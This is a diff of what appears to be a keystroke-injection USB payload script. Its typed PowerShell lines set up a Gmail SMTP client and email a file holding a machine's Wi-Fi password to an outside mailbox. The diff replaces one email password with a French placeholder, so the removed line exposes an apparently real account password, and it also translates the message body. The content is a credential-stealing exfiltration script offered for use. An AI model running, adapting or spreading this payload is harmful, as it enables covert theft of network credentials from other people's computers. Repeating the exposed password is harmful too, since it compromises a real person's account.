@@ -24,7 +24,7 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('tonmail@gmail.com', 'ankenna75');
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('tonmail@gmail.com', 'motdepasse');
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
@@ -34,7 +34,7 @@ STRING $ReportEmail.To.Add('mailreception@gmail.com')
 ENTER
 STRING $ReportEmail.Subject = 'Wi-fi Password'
 ENTER
-STRING $ReportEmail.Body = 'Attached is a file containing the wifi password'
+STRING $ReportEmail.Body = 'Contient le fichier avec le mot de passe Wifi'
 ENTER
 STRING $ReportEmail.Attachments.Add('c:\MotdePasse.txt')
 ENTER
